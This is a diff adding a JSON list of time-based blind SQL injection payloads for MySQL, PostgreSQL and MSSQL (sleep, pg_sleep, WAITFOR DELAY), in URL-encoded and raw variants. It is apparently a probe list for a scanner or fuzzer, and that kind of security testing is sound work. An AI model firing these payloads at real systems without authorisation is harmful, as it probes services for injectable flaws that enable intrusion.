@@ -1,0 +1,14 @@
+[
+    "%27+AND+sleep%2810%29%23",
+    "%27+AND+pg_sleep%2810%29%23",
+    "%27%3B+WAITFOR+DELAY+%270%3A0%3A10%27--",
+    "' AND sleep(10)#",
+    "' AND pg_sleep(10)--",
+    "'; WAITFOR DELAY '0:0:10'--",
+    "1%27+AND+sleep%2810%29%23",
+    "1%27+AND+pg_sleep%2810%29%23",
+    "1%27%3B+WAITFOR+DELAY+%270%3A0%3A10%27--",
+    "1' AND sleep(10)#",
+    "1' AND pg_sleep(10)--",
+    "1'; WAITFOR DELAY '0:0:10'--"
+]
